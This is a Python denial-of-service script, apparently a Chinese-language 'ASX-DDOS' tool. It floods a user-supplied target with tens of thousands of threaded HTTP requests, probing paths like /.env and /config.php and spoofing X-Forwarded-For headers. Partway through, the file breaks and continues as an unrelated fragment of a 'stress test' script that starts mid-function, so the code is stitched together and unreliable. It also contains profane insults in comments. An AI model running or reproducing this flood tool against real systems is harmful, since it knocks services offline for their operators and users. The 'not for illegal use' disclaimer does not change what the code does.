import requests
import threading
import time
import random
import socket
import os
import sys

# 参数配置
a = 50000       # 请求
b = 500         # 线程
c = 2           # 超时时间
d = 2000        #池子
e = [           
    'http://nmsl.com'
]
#↑默认配置

f = [
    '/?id=',
    '/wp-admin/',
    '/api/v1/',
    '/.env',
    '/config.php'
    '/index.html'
    '/admin'
]

# 可以自行添加更多头部
g = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Android 10; Mobile)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0)",
]

def h(target):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(c)
        s.connect((target.split('/')[2], 80))
        payload = f"GET {random.choice(f)}{random.randint(1,10000)} HTTP/1.1\r\n"
        payload += f"Host: {target.split('/')[2]}\r\n"
        payload += f"User-Agent: {random.choice(g)}\r\n"
        payload += f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
        payload += "Accept: */*\r\nConnection: keep-alive\r\n\r\n"
        s.send(payload.encode())
        time.sleep(0.1)
        s.close()
    except:
        pass







def i():
    print("🔥 ASX-DDOS 超暴力模式启动 🔥")
    target = input("输入目标URL/IP: ").strip()
    if not target.startswith('http'):
        target = 'http://' + target
    threads = []
    count = 0
    print(f"🚀 开始攻击 {target}")
    print(f"💣 线程数: {b}")
    print(f"⏱ 超时: {c}秒")
    
    start = time.time()
    
    for _ in range(a):
        t = threading.Thread(target=h, args=(target,))
        t.daemon = True
        threads.append(t)
        t.start()
        count += 1
        
        if len(threads) >= b:
            for t in threads:
                t.join()
            threads = []
        if count % 1000 == 0:
            print(f"💥 已发送 {count} 次请求", end='\r')
    total = time.time() - start
    print(f"\n✅ 攻击完成! 总耗时: {total:.2f}秒")
    print(f"🚀 平均速率: {a/total:.2f} 请求/秒")
def j():
    os.system('clear' if os.name == 'posix' else 'cls')
    print("""
    █████╗ ███████╗██╗      ██╗
    ██╔══██╗██╔════╝╚██╗██╔╝
    ███████║███████╗ ╚███╔   芥末社区搜asx
    ██╔══██║╚════██║ ██╔██ ╗ 禁止非法用途
    ██║  ██║███████║██╔╝   ██╗测试项目仅供参考
    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚
    """)
    print("1. 启动超暴力模式")
    print("2. 设置参数")
    print("0. 退出")
    
    k = input("选择: ")
    if k == '1':
        i()
    elif k == '2':
        l()
    elif k == '0':
        sys.exit()
    else:
        print("无效输入!")
        time.sleep(1)
        j()

# 参数设置
def l():
    global a,b,c,d
    os.system('clear' if os.name == 'posix' else 'cls')
    print("⚙ 参数配置")
    try:
        a = int(input(f"总请求 [{a}]: ") or a)
        b = int(input(f"线程数 [{b}]: ") or b)
        c = int(input(f"超时时间 [{c}]: ") or c)
        d = int(input(f"池大小 [{d}]: ") or d)
        print("✅ 参数已更新")
    except:
        print("❌ 无效输入!")
    time.sleep(1)
    j()

if __name__ == "__main__":
    try:
        j()
    except KeyboardInterrupt:
        print("\n攻击已终止")
        sys.exit() 'error': str(e)
        }
    finally:
        return_session(session)
        
        with stats_lock:
            request_count += 1
            if request_count % 100 == 0:
                print(f"⏳ 已完成请求: {request_count}", end='\r')
    
    return result

def run_test(target_urls, num_requests, workers):
    """执行压"""
    global request_count, TIMEOUT
    os.environ['NO_PROXY'] = '*'
    os.environ['http_proxy'] = ''
    os.environ['https_proxy'] = ''
    init_session_pool()
    
    show_banner()
    print("🚀 开始压力测试: ")
    for url in target_urls:
        print(f"    {url}")
    print(f"💥 总请求数: {num_requests}")
    print(f"⚡ 并发线程数: {workers}")
    print(f"⏱ 请求超时: {TIMEOUT}秒")
    print("="*50)
    
    start_time = time.time()
    results = []
    request_count = 0
    
    with concurrent.futures.ThreadPoolExecutor(
        max_workers=workers,
        thread_name_prefix='req'
    ) as executor:
        futures = []
        for _ in range(num_requests):
            url = random.choice(target_urls) if len(target_urls) > 1 else target_urls[0]
            futures.append(executor.submit(make_request, url))
        
        for future in concurrent.futures.as_completed(futures):
            results.append(future.result())
    total_time = time.time() - start_time
    successful = [r for r in results if r['success']]
    failed = [r for r in results if not r['success']]
    response_times = [r['time'] for r in successful]
    show_banner()
    print("📊 压力测试结果:")
    print(f"🕒 总耗时: {total_time:.2f}秒")
    print(f"📈 吞吐量: {num_requests/total_time:.2f} 请求/秒")
    print(f"✅ 成功请求: {len(successful)} ({len(successful)/num_requests*100:.1f}%)")
    print(f"❌ 失败请求: {len(failed)} ({len(failed)/num_requests*100:.1f}%)")
    if response_times:
        print("\n⏱ 响应时间统计:")
        print(f"📊 平均: {statistics.mean(response_times)*1000:.1f}毫秒")
        print(f"⬇ 最小: {min(response_times)*1000:.1f}毫秒")
        print(f"⬆ 最大: {max(response_times)*1000:.1f}毫秒")
    if failed and len(failed) < 20:
        print("\n🔧 常见错误:")
        error_counts = {}
        for f in failed:
            error_counts[f['error']] = error_counts.get(f['error'], 0) + 1
        for error, count in sorted(error_counts.items(), key=lambda x: x[1], reverse=True):
            print(f"- {error}: {count}次")
    input("\n按Enter键返回主菜单...")

def get_user_targets():
    """二改狗你妈死了"""
    show_banner()
    print("🎯 选择目标类型:")
    print("1. URL ")
    print("2. IP (例如: 192.168.1.1:80)")
    print("3. 使用默认测试目标")
    print("0. 退出程序")
    
    choice = input("请选择(1-3): ")
    
    if choice == '0':
        exit()
    elif choice == '1':
        urls = []
        while True:
            url = input("请输入URL (留空结束): ").strip()
            if not url:
                break
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
            urls.append(url)
        return urls if urls else DEFAULT_TARGETS
    elif choice == '2':
        targets = []
        while True:
            ip_port = input("请输入IP:端口 (留空结束): ").strip()
            if not ip_port:
                break
            if ':' not in ip_port:
                ip_port += ':80'
            targets.append(f"http://{ip_port}")
        return targets if targets else DEFAULT_TARGETS
    elif choice == '3':
        return DEFAULT_TARGETS
    else:
        print("无效输入，使用默认目标")
        return DEFAULT_TARGETS

def get_test_params():
    show_banner()
    print("⚙ 设置测试参数:")
    try:
        num = input("总请求数 (默认{}): ".format(NUM_REQUESTS))
        num = int(num) if num else NUM_REQUESTS
        workers = input("并发线程数 (默认{}): ".format(CONCURRENT_WORKERS))
        workers = int(workers) if workers else CONCURRENT_WORKERS
        timeout = input("超时时间秒 (默认{}): ".format(TIMEOUT))
        timeout = int(timeout) if timeout else TIMEOUT
        num = min(num, 50000)
        workers = min(workers, 300)
        timeout = min(timeout, 10)
        
        return num, workers, timeout
    except:
        print("无效输入，使用默认参数")
        return NUM_REQUESTS, CONCURRENT_WORKERS, TIMEOUT

def main_menu():
    global TIMEOUT
    
    while True:
        show_banner()
        print("📱 菜单:")
        print("1. 开始压力测试")
        print("2. 设置测试目标")
        print("3. 设置测试参数")
        print("0. 退出程序")
        choice = input("请选择(1-3): ")
        if choice == '1':
            targets = get_user_targets()
            num_requests, workers, timeout = get_test_params()
            TIMEOUT = timeout
            run_test(targets, num_requests, workers)
        elif choice == '2':
            targets = get_user_targets()
            print("当前目标设置为: ")
            for url in targets:
                print(f"    {url}")
            input("按Enter键继续...")
        elif choice == '3':
            num_requests, workers, timeout = get_test_params()
            print(f"参数已设置为: 请求数={num_requests}, 并发={workers}, 超时={timeout}s")
            input("按Enter键继续...")
        elif choice == '0':
            exit()
        else:
            print("无效选择，请重新输入")
            time.sleep(1)
if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print("\n🛑 程序已终止")
        exit()